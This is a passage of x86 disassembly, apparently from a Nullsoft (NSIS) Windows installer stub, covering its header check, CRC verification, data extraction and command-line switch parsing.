  402bb8:	33 c0                	xor    %eax,%eax
  402bba:	c9                   	leave
  402bbb:	c2 10 00             	ret    $0x10
  402bbe:	56                   	push   %esi
  402bbf:	33 f6                	xor    %esi,%esi
  402bc1:	39 74 24 08          	cmp    %esi,0x8(%esp)
  402bc5:	74 18                	je     0x402bdf
  402bc7:	a1 88 97 42 00       	mov    0x429788,%eax
  402bcc:	3b c6                	cmp    %esi,%eax
  402bce:	74 07                	je     0x402bd7
  402bd0:	50                   	push   %eax
  402bd1:	ff 15 e8 71 40 00    	call   *0x4071e8
  402bd7:	89 35 88 97 42 00    	mov    %esi,0x429788
  402bdd:	5e                   	pop    %esi
  402bde:	c3                   	ret
  402bdf:	39 35 88 97 42 00    	cmp    %esi,0x429788
  402be5:	74 08                	je     0x402bef
  402be7:	56                   	push   %esi
  402be8:	e8 7a 31 00 00       	call   0x405d67
  402bed:	5e                   	pop    %esi
  402bee:	c3                   	ret
  402bef:	ff 15 8c 70 40 00    	call   *0x40708c
  402bf5:	3b 05 6c 1b 45 00    	cmp    0x451b6c,%eax
  402bfb:	76 23                	jbe    0x402c20
  402bfd:	56                   	push   %esi
  402bfe:	68 3b 2b 40 00       	push   $0x402b3b
  402c03:	56                   	push   %esi
  402c04:	6a 6f                	push   $0x6f
  402c06:	ff 35 60 1b 45 00    	push   0x451b60
  402c0c:	ff 15 ec 71 40 00    	call   *0x4071ec
  402c12:	6a 05                	push   $0x5
  402c14:	50                   	push   %eax
  402c15:	a3 88 97 42 00       	mov    %eax,0x429788
  402c1a:	ff 15 60 72 40 00    	call   *0x407260
  402c20:	5e                   	pop    %esi
  402c21:	c3                   	ret
  402c22:	55                   	push   %ebp
  402c23:	8b ec                	mov    %esp,%ebp
  402c25:	83 ec 28             	sub    $0x28,%esp
  402c28:	53                   	push   %ebx
  402c29:	56                   	push   %esi
  402c2a:	33 db                	xor    %ebx,%ebx
  402c2c:	57                   	push   %edi
  402c2d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402c30:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402c33:	ff 15 8c 70 40 00    	call   *0x40708c
  402c39:	be 00 80 48 00       	mov    $0x488000,%esi
  402c3e:	68 00 20 00 00       	push   $0x2000
  402c43:	05 e8 03 00 00       	add    $0x3e8,%eax
  402c48:	56                   	push   %esi
  402c49:	53                   	push   %ebx
  402c4a:	a3 6c 1b 45 00       	mov    %eax,0x451b6c
  402c4f:	ff 15 94 70 40 00    	call   *0x407094
  402c55:	6a 03                	push   $0x3
  402c57:	68 00 00 00 80       	push   $0x80000000
  402c5c:	56                   	push   %esi
  402c5d:	e8 81 2a 00 00       	call   0x4056e3
  402c62:	8b f8                	mov    %eax,%edi
  402c64:	83 ff ff             	cmp    $0xffffffff,%edi
  402c67:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402c6a:	89 3d 14 90 40 00    	mov    %edi,0x409014
  402c70:	75 0a                	jne    0x402c7c
  402c72:	b8 04 91 40 00       	mov    $0x409104,%eax
  402c77:	e9 d8 01 00 00       	jmp    0x402e54
  402c7c:	56                   	push   %esi
  402c7d:	be 00 00 48 00       	mov    $0x480000,%esi
  402c82:	56                   	push   %esi
  402c83:	e8 84 2d 00 00       	call   0x405a0c
  402c88:	56                   	push   %esi
  402c89:	e8 b8 28 00 00       	call   0x405546
  402c8e:	50                   	push   %eax
  402c8f:	68 00 a0 48 00       	push   $0x48a000
  402c94:	e8 73 2d 00 00       	call   0x405a0c
  402c99:	53                   	push   %ebx
  402c9a:	57                   	push   %edi
  402c9b:	ff 15 90 70 40 00    	call   *0x407090
  402ca1:	3b c3                	cmp    %ebx,%eax
  402ca3:	a3 90 17 43 00       	mov    %eax,0x431790
  402ca8:	8b f0                	mov    %eax,%esi
  402caa:	0f 8e e7 00 00 00    	jle    0x402d97
  402cb0:	bb 90 97 42 00       	mov    $0x429790,%ebx
  402cb5:	a1 74 1b 45 00       	mov    0x451b74,%eax
  402cba:	8b fe                	mov    %esi,%edi
  402cbc:	f7 d8                	neg    %eax
  402cbe:	1b c0                	sbb    %eax,%eax
  402cc0:	25 00 7e 00 00       	and    $0x7e00,%eax
  402cc5:	05 00 02 00 00       	add    $0x200,%eax
  402cca:	3b f0                	cmp    %eax,%esi
  402ccc:	7c 02                	jl     0x402cd0
  402cce:	8b f8                	mov    %eax,%edi
  402cd0:	57                   	push   %edi
  402cd1:	53                   	push   %ebx
  402cd2:	e8 a6 03 00 00       	call   0x40307d
  402cd7:	85 c0                	test   %eax,%eax
  402cd9:	0f 84 22 01 00 00    	je     0x402e01
  402cdf:	83 3d 74 1b 45 00 00 	cmpl   $0x0,0x451b74
  402ce6:	75 7a                	jne    0x402d62
  402ce8:	6a 1c                	push   $0x1c
  402cea:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402ced:	53                   	push   %ebx
  402cee:	50                   	push   %eax
  402cef:	e8 b0 29 00 00       	call   0x4056a4
  402cf4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402cf7:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402cfc:	75 72                	jne    0x402d70
  402cfe:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  402d05:	75 69                	jne    0x402d70
  402d07:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  402d0e:	75 60                	jne    0x402d70
  402d10:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  402d17:	75 57                	jne    0x402d70
  402d19:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  402d20:	75 4e                	jne    0x402d70
  402d22:	09 45 08             	or     %eax,0x8(%ebp)
  402d25:	8b 45 08             	mov    0x8(%ebp),%eax
  402d28:	8b 0d 80 d7 41 00    	mov    0x41d780,%ecx
  402d2e:	83 e0 02             	and    $0x2,%eax
  402d31:	09 05 00 1c 45 00    	or     %eax,0x451c00
  402d37:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d3a:	3b c6                	cmp    %esi,%eax
  402d3c:	89 0d 74 1b 45 00    	mov    %ecx,0x451b74
  402d42:	0f 8f b2 00 00 00    	jg     0x402dfa
  402d48:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402d4c:	75 06                	jne    0x402d54
  402d4e:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402d52:	75 41                	jne    0x402d95
  402d54:	ff 45 fc             	incl   -0x4(%ebp)
  402d57:	8d 70 fc             	lea    -0x4(%eax),%esi
  402d5a:	3b fe                	cmp    %esi,%edi
  402d5c:	76 12                	jbe    0x402d70
  402d5e:	8b fe                	mov    %esi,%edi
  402d60:	eb 0e                	jmp    0x402d70
  402d62:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402d66:	75 08                	jne    0x402d70
  402d68:	6a 00                	push   $0x0
  402d6a:	e8 4f fe ff ff       	call   0x402bbe
  402d6f:	59                   	pop    %ecx
  402d70:	3b 35 90 17 43 00    	cmp    0x431790,%esi
  402d76:	7d 0d                	jge    0x402d85
  402d78:	57                   	push   %edi
  402d79:	53                   	push   %ebx
  402d7a:	ff 75 f8             	push   -0x8(%ebp)
  402d7d:	e8 18 30 00 00       	call   0x405d9a
  402d82:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402d85:	01 3d 80 d7 41 00    	add    %edi,0x41d780
  402d8b:	2b f7                	sub    %edi,%esi
  402d8d:	85 f6                	test   %esi,%esi
  402d8f:	0f 8f 20 ff ff ff    	jg     0x402cb5
  402d95:	33 db                	xor    %ebx,%ebx
  402d97:	6a 01                	push   $0x1
  402d99:	e8 20 fe ff ff       	call   0x402bbe
  402d9e:	39 1d 74 1b 45 00    	cmp    %ebx,0x451b74
  402da4:	59                   	pop    %ecx
  402da5:	74 53                	je     0x402dfa
  402da7:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  402daa:	74 22                	je     0x402dce
  402dac:	ff 35 80 d7 41 00    	push   0x41d780
  402db2:	e8 f8 02 00 00       	call   0x4030af
  402db7:	8d 45 08             	lea    0x8(%ebp),%eax
  402dba:	6a 04                	push   $0x4
  402dbc:	50                   	push   %eax
  402dbd:	e8 bb 02 00 00       	call   0x40307d
  402dc2:	85 c0                	test   %eax,%eax
  402dc4:	74 34                	je     0x402dfa
  402dc6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402dc9:	3b 45 08             	cmp    0x8(%ebp),%eax
  402dcc:	75 2c                	jne    0x402dfa
  402dce:	ff 75 ec             	push   -0x14(%ebp)
  402dd1:	6a 40                	push   $0x40
  402dd3:	ff 15 00 71 40 00    	call   *0x407100
  402dd9:	8b f0                	mov    %eax,%esi
  402ddb:	a1 74 1b 45 00       	mov    0x451b74,%eax
  402de0:	83 c0 1c             	add    $0x1c,%eax
  402de3:	50                   	push   %eax
  402de4:	e8 c6 02 00 00       	call   0x4030af
  402de9:	ff 75 ec             	push   -0x14(%ebp)
  402dec:	56                   	push   %esi
  402ded:	53                   	push   %ebx
  402dee:	6a ff                	push   $0xffffffff
  402df0:	e8 66 00 00 00       	call   0x402e5b
  402df5:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  402df8:	74 11                	je     0x402e0b
  402dfa:	b8 38 90 40 00       	mov    $0x409038,%eax
  402dff:	eb 53                	jmp    0x402e54
  402e01:	6a 01                	push   $0x1
  402e03:	e8 b6 fd ff ff       	call   0x402bbe
  402e08:	59                   	pop    %ecx
  402e09:	eb ef                	jmp    0x402dfa
  402e0b:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  402e0f:	89 35 70 1b 45 00    	mov    %esi,0x451b70
  402e15:	8b 06                	mov    (%esi),%eax
  402e17:	a3 78 1b 45 00       	mov    %eax,0x451b78
  402e1c:	74 06                	je     0x402e24
  402e1e:	ff 05 7c 1b 45 00    	incl   0x451b7c
  402e24:	6a 08                	push   $0x8
  402e26:	8d 46 44             	lea    0x44(%esi),%eax
  402e29:	59                   	pop    %ecx
  402e2a:	83 e8 08             	sub    $0x8,%eax
  402e2d:	01 30                	add    %esi,(%eax)
  402e2f:	49                   	dec    %ecx
  402e30:	75 f8                	jne    0x402e2a
  402e32:	6a 01                	push   $0x1
  402e34:	53                   	push   %ebx
  402e35:	53                   	push   %ebx
  402e36:	ff 75 f4             	push   -0xc(%ebp)
  402e39:	ff 15 34 71 40 00    	call   *0x407134
  402e3f:	89 46 3c             	mov    %eax,0x3c(%esi)
  402e42:	83 c6 04             	add    $0x4,%esi
  402e45:	6a 40                	push   $0x40
  402e47:	56                   	push   %esi
  402e48:	68 80 1b 45 00       	push   $0x451b80
  402e4d:	e8 52 28 00 00       	call   0x4056a4
  402e52:	33 c0                	xor    %eax,%eax
  402e54:	5f                   	pop    %edi
  402e55:	5e                   	pop    %esi
  402e56:	5b                   	pop    %ebx
  402e57:	c9                   	leave
  402e58:	c2 04 00             	ret    $0x4
  402e5b:	55                   	push   %ebp
  402e5c:	8b ec                	mov    %esp,%ebp
  402e5e:	83 ec 58             	sub    $0x58,%esp
  402e61:	53                   	push   %ebx
  402e62:	56                   	push   %esi
  402e63:	8b 75 14             	mov    0x14(%ebp),%esi
  402e66:	57                   	push   %edi
  402e67:	8b 7d 10             	mov    0x10(%ebp),%edi
  402e6a:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402e6d:	85 ff                	test   %edi,%edi
  402e6f:	75 07                	jne    0x402e78
  402e71:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  402e78:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402e7c:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402e7f:	85 ff                	test   %edi,%edi
  402e81:	75 07                	jne    0x402e8a
  402e83:	c7 45 f4 88 17 42 00 	movl   $0x421788,-0xc(%ebp)
  402e8a:	8b 45 08             	mov    0x8(%ebp),%eax
  402e8d:	85 c0                	test   %eax,%eax
  402e8f:	7c 0e                	jl     0x402e9f
  402e91:	8b 0d b8 1b 45 00    	mov    0x451bb8,%ecx
  402e97:	03 c8                	add    %eax,%ecx
  402e99:	51                   	push   %ecx
  402e9a:	e8 10 02 00 00       	call   0x4030af
  402e9f:	8d 45 14             	lea    0x14(%ebp),%eax
  402ea2:	6a 04                	push   $0x4
  402ea4:	50                   	push   %eax
  402ea5:	e8 d3 01 00 00       	call   0x40307d
  402eaa:	85 c0                	test   %eax,%eax
  402eac:	0f 84 76 01 00 00    	je     0x403028
  402eb2:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  402eb6:	0f 84 55 01 00 00    	je     0x403011
  402ebc:	8b 1d 8c 70 40 00    	mov    0x40708c,%ebx
  402ec2:	ff d3                	call   *%ebx
  402ec4:	83 25 ec 40 41 00 00 	andl   $0x0,0x4140ec
  402ecb:	83 25 e8 40 41 00 00 	andl   $0x0,0x4140e8
  402ed2:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  402ed9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402edc:	b8 70 57 41 00       	mov    $0x415770,%eax
  402ee1:	c7 05 d0 3b 41 00 08 	movl   $0x8,0x413bd0
  402ee8:	00 00 00 
  402eeb:	a3 78 d7 41 00       	mov    %eax,0x41d778
  402ef0:	a3 74 d7 41 00       	mov    %eax,0x41d774
  402ef5:	8b 45 14             	mov    0x14(%ebp),%eax
  402ef8:	c7 05 70 d7 41 00 70 	movl   $0x41d770,0x41d770
  402eff:	d7 41 00 
  402f02:	89 45 08             	mov    %eax,0x8(%ebp)
  402f05:	0f 8e 68 01 00 00    	jle    0x403073
  402f0b:	be 00 40 00 00       	mov    $0x4000,%esi
  402f10:	39 75 14             	cmp    %esi,0x14(%ebp)
  402f13:	7d 03                	jge    0x402f18
  402f15:	8b 75 14             	mov    0x14(%ebp),%esi
  402f18:	bf 88 d7 41 00       	mov    $0x41d788,%edi
  402f1d:	56                   	push   %esi
  402f1e:	57                   	push   %edi
  402f1f:	e8 59 01 00 00       	call   0x40307d
  402f24:	85 c0                	test   %eax,%eax
  402f26:	0f 84 fc 00 00 00    	je     0x403028
  402f2c:	29 75 14             	sub    %esi,0x14(%ebp)
  402f2f:	89 3d c0 3b 41 00    	mov    %edi,0x413bc0
  402f35:	89 35 c4 3b 41 00    	mov    %esi,0x413bc4
  402f3b:	8b 7d f4             	mov    -0xc(%ebp),%edi
  402f3e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f41:	68 c0 3b 41 00       	push   $0x413bc0
  402f46:	89 3d c8 3b 41 00    	mov    %edi,0x413bc8
  402f4c:	a3 cc 3b 41 00       	mov    %eax,0x413bcc
  402f51:	e8 b2 2e 00 00       	call   0x405e08
  402f56:	85 c0                	test   %eax,%eax
  402f58:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402f5b:	0f 8c a8 00 00 00    	jl     0x403009
  402f61:	8b 35 c8 3b 41 00    	mov    0x413bc8,%esi
  402f67:	2b f7                	sub    %edi,%esi
  402f69:	ff d3                	call   *%ebx
  402f6b:	f6 05 14 1c 45 00 01 	testb  $0x1,0x451c14
  402f72:	8b f8                	mov    %eax,%edi
  402f74:	74 43                	je     0x402fb9
  402f76:	2b 45 f0             	sub    -0x10(%ebp),%eax
  402f79:	3d c8 00 00 00       	cmp    $0xc8,%eax
  402f7e:	77 06                	ja     0x402f86
  402f80:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  402f84:	75 33                	jne    0x402fb9
  402f86:	8b 45 08             	mov    0x8(%ebp),%eax
  402f89:	ff 75 08             	push   0x8(%ebp)
  402f8c:	2b 45 14             	sub    0x14(%ebp),%eax
  402f8f:	6a 64                	push   $0x64
  402f91:	50                   	push   %eax
  402f92:	ff 15 30 71 40 00    	call   *0x407130
  402f98:	50                   	push   %eax
  402f99:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402f9c:	68 20 91 40 00       	push   $0x409120
  402fa1:	50                   	push   %eax
  402fa2:	ff 15 00 72 40 00    	call   *0x407200
  402fa8:	83 c4 0c             	add    $0xc,%esp
  402fab:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402fae:	50                   	push   %eax
  402faf:	6a 00                	push   $0x0
  402fb1:	e8 f4 1d 00 00       	call   0x404daa
  402fb6:	89 7d f0             	mov    %edi,-0x10(%ebp)
  402fb9:	33 c0                	xor    %eax,%eax
  402fbb:	3b f0                	cmp    %eax,%esi
  402fbd:	74 3f                	je     0x402ffe
  402fbf:	39 45 10             	cmp    %eax,0x10(%ebp)
  402fc2:	75 20                	jne    0x402fe4
  402fc4:	50                   	push   %eax
  402fc5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402fc8:	50                   	push   %eax
  402fc9:	56                   	push   %esi
  402fca:	ff 75 f4             	push   -0xc(%ebp)
  402fcd:	ff 75 0c             	push   0xc(%ebp)
  402fd0:	ff 15 28 71 40 00    	call   *0x407128
  402fd6:	85 c0                	test   %eax,%eax
  402fd8:	74 33                	je     0x40300d
  402fda:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  402fdd:	75 2e                	jne    0x40300d
  402fdf:	01 75 fc             	add    %esi,-0x4(%ebp)
  402fe2:	eb 0e                	jmp    0x402ff2
  402fe4:	a1 c8 3b 41 00       	mov    0x413bc8,%eax
  402fe9:	01 75 fc             	add    %esi,-0x4(%ebp)
  402fec:	29 75 f8             	sub    %esi,-0x8(%ebp)
  402fef:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402ff2:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  402ff6:	0f 85 3f ff ff ff    	jne    0x402f3b
  402ffc:	eb 75                	jmp    0x403073
  402ffe:	39 45 14             	cmp    %eax,0x14(%ebp)
  403001:	0f 8f 04 ff ff ff    	jg     0x402f0b
  403007:	eb 6a                	jmp    0x403073
  403009:	6a fc                	push   $0xfffffffc
  40300b:	eb 1d                	jmp    0x40302a
  40300d:	6a fe                	push   $0xfffffffe
  40300f:	eb 19                	jmp    0x40302a
  403011:	85 ff                	test   %edi,%edi
  403013:	74 53                	je     0x403068
  403015:	39 75 14             	cmp    %esi,0x14(%ebp)
  403018:	7d 03                	jge    0x40301d
  40301a:	8b 75 14             	mov    0x14(%ebp),%esi
  40301d:	56                   	push   %esi
  40301e:	57                   	push   %edi
  40301f:	e8 59 00 00 00       	call   0x40307d
  403024:	85 c0                	test   %eax,%eax
  403026:	75 48                	jne    0x403070
  403028:	6a fd                	push   $0xfffffffd
  40302a:	58                   	pop    %eax
  40302b:	eb 49                	jmp    0x403076
  40302d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  403030:	39 75 14             	cmp    %esi,0x14(%ebp)
  403033:	7d 03                	jge    0x403038
  403035:	8b 75 14             	mov    0x14(%ebp),%esi
  403038:	bf 88 d7 41 00       	mov    $0x41d788,%edi
  40303d:	56                   	push   %esi
  40303e:	57                   	push   %edi
  40303f:	e8 39 00 00 00       	call   0x40307d
  403044:	85 c0                	test   %eax,%eax
  403046:	74 e0                	je     0x403028
  403048:	8d 45 10             	lea    0x10(%ebp),%eax
  40304b:	6a 00                	push   $0x0
  40304d:	50                   	push   %eax
  40304e:	56                   	push   %esi
  40304f:	57                   	push   %edi
  403050:	ff 75 0c             	push   0xc(%ebp)
  403053:	ff 15 28 71 40 00    	call   *0x407128
  403059:	85 c0                	test   %eax,%eax
  40305b:	74 b0                	je     0x40300d
  40305d:	3b 75 10             	cmp    0x10(%ebp),%esi
  403060:	75 ab                	jne    0x40300d
  403062:	01 75 fc             	add    %esi,-0x4(%ebp)
  403065:	29 75 14             	sub    %esi,0x14(%ebp)
  403068:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40306c:	7f bf                	jg     0x40302d
  40306e:	eb 03                	jmp    0x403073
  403070:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403073:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403076:	5f                   	pop    %edi
  403077:	5e                   	pop    %esi
  403078:	5b                   	pop    %ebx
  403079:	c9                   	leave
  40307a:	c2 10 00             	ret    $0x10
  40307d:	55                   	push   %ebp
  40307e:	8b ec                	mov    %esp,%ebp
  403080:	56                   	push   %esi
  403081:	8b 75 0c             	mov    0xc(%ebp),%esi
  403084:	8d 45 0c             	lea    0xc(%ebp),%eax
  403087:	6a 00                	push   $0x0
  403089:	50                   	push   %eax
  40308a:	56                   	push   %esi
  40308b:	ff 75 08             	push   0x8(%ebp)
  40308e:	ff 35 14 90 40 00    	push   0x409014
  403094:	ff 15 2c 71 40 00    	call   *0x40712c
  40309a:	85 c0                	test   %eax,%eax
  40309c:	74 0a                	je     0x4030a8
  40309e:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4030a1:	75 05                	jne    0x4030a8
  4030a3:	33 c0                	xor    %eax,%eax
  4030a5:	40                   	inc    %eax
  4030a6:	eb 02                	jmp    0x4030aa
  4030a8:	33 c0                	xor    %eax,%eax
  4030aa:	5e                   	pop    %esi
  4030ab:	5d                   	pop    %ebp
  4030ac:	c2 08 00             	ret    $0x8
  4030af:	6a 00                	push   $0x0
  4030b1:	6a 00                	push   $0x0
  4030b3:	ff 74 24 0c          	push   0xc(%esp)
  4030b7:	ff 35 14 90 40 00    	push   0x409014
  4030bd:	ff 15 34 71 40 00    	call   *0x407134
  4030c3:	c2 04 00             	ret    $0x4
  4030c6:	56                   	push   %esi
  4030c7:	be 00 40 48 00       	mov    $0x484000,%esi
  4030cc:	56                   	push   %esi
  4030cd:	e8 9c 2b 00 00       	call   0x405c6e
  4030d2:	56                   	push   %esi
  4030d3:	e8 94 24 00 00       	call   0x40556c
  4030d8:	85 c0                	test   %eax,%eax
  4030da:	75 02                	jne    0x4030de
  4030dc:	5e                   	pop    %esi
  4030dd:	c3                   	ret
  4030de:	56                   	push   %esi
  4030df:	e8 1b 24 00 00       	call   0x4054ff
  4030e4:	6a 00                	push   $0x0
  4030e6:	56                   	push   %esi
  4030e7:	ff 15 80 70 40 00    	call   *0x407080
  4030ed:	56                   	push   %esi
  4030ee:	68 00 20 48 00       	push   $0x482000
  4030f3:	e8 1a 26 00 00       	call   0x405712
  4030f8:	5e                   	pop    %esi
  4030f9:	c3                   	ret
  4030fa:	81 ec 80 01 00 00    	sub    $0x180,%esp
  403100:	53                   	push   %ebx
  403101:	55                   	push   %ebp
  403102:	56                   	push   %esi
  403103:	33 db                	xor    %ebx,%ebx
  403105:	57                   	push   %edi
  403106:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  40310a:	c7 44 24 10 60 91 40 	movl   $0x409160,0x10(%esp)
  403111:	00 
  403112:	33 f6                	xor    %esi,%esi
  403114:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  403119:	ff 15 30 70 40 00    	call   *0x407030
  40311f:	68 01 80 00 00       	push   $0x8001
  403124:	ff 15 b0 70 40 00    	call   *0x4070b0
  40312a:	53                   	push   %ebx
  40312b:	ff 15 7c 72 40 00    	call   *0x40727c
  403131:	6a 08                	push   $0x8
  403133:	a3 18 1c 45 00       	mov    %eax,0x451c18
  403138:	e8 f1 2b 00 00       	call   0x405d2e
  40313d:	a3 64 1b 45 00       	mov    %eax,0x451b64
  403142:	53                   	push   %ebx
  403143:	8d 44 24 34          	lea    0x34(%esp),%eax
  403147:	68 60 01 00 00       	push   $0x160
  40314c:	50                   	push   %eax
  40314d:	53                   	push   %ebx
  40314e:	68 98 37 43 00       	push   $0x433798
  403153:	ff 15 58 71 40 00    	call   *0x407158
  403159:	68 54 91 40 00       	push   $0x409154
  40315e:	68 60 db 44 00       	push   $0x44db60
  403163:	e8 a4 28 00 00       	call   0x405a0c
  403168:	ff 15 ac 70 40 00    	call   *0x4070ac
  40316e:	bf 00 a0 47 00       	mov    $0x47a000,%edi
  403173:	50                   	push   %eax
  403174:	57                   	push   %edi
  403175:	e8 92 28 00 00       	call   0x405a0c
  40317a:	53                   	push   %ebx
  40317b:	ff 15 0c 71 40 00    	call   *0x40710c
  403181:	80 3d 00 a0 47 00 22 	cmpb   $0x22,0x47a000
  403188:	a3 60 1b 45 00       	mov    %eax,0x451b60
  40318d:	8b c7                	mov    %edi,%eax
  40318f:	75 0a                	jne    0x40319b
  403191:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  403196:	b8 01 a0 47 00       	mov    $0x47a001,%eax
  40319b:	ff 74 24 14          	push   0x14(%esp)
  40319f:	50                   	push   %eax
  4031a0:	e8 85 23 00 00       	call   0x40552a
  4031a5:	50                   	push   %eax
  4031a6:	ff 15 1c 72 40 00    	call   *0x40721c
  4031ac:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4031b0:	eb 63                	jmp    0x403215
  4031b2:	80 f9 20             	cmp    $0x20,%cl
  4031b5:	75 06                	jne    0x4031bd
  4031b7:	40                   	inc    %eax
  4031b8:	80 38 20             	cmpb   $0x20,(%eax)
  4031bb:	74 fa                	je     0x4031b7
  4031bd:	80 38 22             	cmpb   $0x22,(%eax)
  4031c0:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  4031c5:	75 06                	jne    0x4031cd
  4031c7:	40                   	inc    %eax
  4031c8:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  4031cd:	80 38 2f             	cmpb   $0x2f,(%eax)
  4031d0:	75 33                	jne    0x403205
  4031d2:	40                   	inc    %eax
  4031d3:	80 38 53             	cmpb   $0x53,(%eax)
  4031d6:	75 0e                	jne    0x4031e6
  4031d8:	8a 48 01             	mov    0x1(%eax),%cl
  4031db:	80 c9 20             	or     $0x20,%cl
  4031de:	80 f9 20             	cmp    $0x20,%cl
  4031e1:	75 03                	jne    0x4031e6
  4031e3:	83 ce 02             	or     $0x2,%esi
  4031e6:	81 38 4e 43 52 43    	cmpl   $0x4352434e,(%eax)
  4031ec:	75 0e                	jne    0x4031fc
  4031ee:	8a 48 04             	mov    0x4(%eax),%cl
  4031f1:	80 c9 20             	or     $0x20,%cl
  4031f4:	80 f9 20             	cmp    $0x20,%cl
  4031f7:	75 03                	jne    0x4031fc
  4031f9:	83 ce 04             	or     $0x4,%esi
  4031fc:	81 78 fe 20 2f 44 3d 	cmpl   $0x3d442f20,-0x2(%eax)
  403203:	74 18                	je     0x40321d
  403205:	ff 74 24 14          	push   0x14(%esp)
  403209:	50                   	push   %eax
  40320a:	e8 1b 23 00 00       	call   0x40552a
  40320f:	80 38 22             	cmpb   $0x22,(%eax)
  403212:	75 01                	jne    0x403215
  403214:	40                   	inc    %eax
  403215:	8a 08                	mov    (%eax),%cl
  403217:	3a cb                	cmp    %bl,%cl
  403219:	75 97                	jne    0x4031b2
  40321b:	eb 11                	jmp    0x40322e
  40321d:	89 58 fe             	mov    %ebx,-0x2(%eax)
  403220:	83 c0 02             	add    $0x2,%eax
  403223:	50                   	push   %eax
  403224:	68 00 c0 47 00       	push   $0x47c000
  403229:	e8 de 27 00 00       	call   0x405a0c
  40322e:	bd 00 40 48 00       	mov    $0x484000,%ebp
  403233:	55                   	push   %ebp
  403234:	68 00 20 00 00       	push   $0x2000
  403239:	ff 15 48 71 40 00    	call   *0x407148
  40323f:	e8 82 fe ff ff       	call   0x4030c6
  403244:	85 c0                	test   %eax,%eax
  403246:	75 20                	jne    0x403268
  403248:	68 fb 1f 00 00       	push   $0x1ffb
  40324d:	55                   	push   %ebp
  40324e:	ff 15 a4 70 40 00    	call   *0x4070a4
  403254:	68 4c 91 40 00       	push   $0x40914c
  403259:	55                   	push   %ebp
  40325a:	e8 c9 27 00 00       	call   0x405a28
  40325f:	e8 62 fe ff ff       	call   0x4030c6
  403264:	85 c0                	test   %eax,%eax
  403266:	74 7e                	je     0x4032e6
  403268:	68 00 20 48 00       	push   $0x482000
  40326d:	ff 15 44 71 40 00    	call   *0x407144
  403273:	56                   	push   %esi
  403274:	e8 a9 f9 ff ff       	call   0x402c22
  403279:	3b c3                	cmp    %ebx,%eax
  40327b:	89 44 24 10          	mov    %eax,0x10(%esp)
  40327f:	75 65                	jne    0x4032e6
  403281:	39 1d 7c 1b 45 00    	cmp    %ebx,0x451b7c
  403287:	74 4d                	je     0x4032d6
  403289:	53                   	push   %ebx
  40328a:	57                   	push   %edi
  40328b:	e8 9a 22 00 00       	call   0x40552a
  403290:	8b f0                	mov    %eax,%esi
  403292:	eb 09                	jmp    0x40329d
  403294:	81 3e 20 5f 3f 3d    	cmpl   $0x3d3f5f20,(%esi)
  40329a:	74 05                	je     0x4032a1
  40329c:	4e                   	dec    %esi
  40329d:	3b f7                	cmp    %edi,%esi
  40329f:	73 f3                	jae    0x403294
  4032a1:	3b f7                	cmp    %edi,%esi
  4032a3:	c7 44 24 10 04 91 40 	movl   $0x409104,0x10(%esp)
  4032aa:	00 
  4032ab:	72 64                	jb     0x403311
  4032ad:	88 1e                	mov    %bl,(%esi)
  4032af:	83 c6 04             	add    $0x4,%esi
  4032b2:	56                   	push   %esi
  4032b3:	e8 28 23 00 00       	call   0x4055e0
  4032b8:	85 c0                	test   %eax,%eax
  4032ba:	74 2a                	je     0x4032e6
  4032bc:	56                   	push   %esi
  4032bd:	68 00 c0 47 00       	push   $0x47c000
  4032c2:	e8 45 27 00 00       	call   0x405a0c
  4032c7:	56                   	push   %esi
  4032c8:	68 00 e0 47 00       	push   $0x47e000
  4032cd:	e8 3a 27 00 00       	call   0x405a0c
  4032d2:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4032d6:	83 0d 0c 1c 45 00 ff 	orl    $0xffffffff,0x451c0c
  4032dd:	e8 73 02 00 00       	call   0x403555
  4032e2:	89 44 24 18          	mov    %eax,0x18(%esp)
  4032e6:	e8 90 01 00 00       	call   0x40347b
  4032eb:	ff 15 80 72 40 00    	call   *0x407280
  4032f1:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
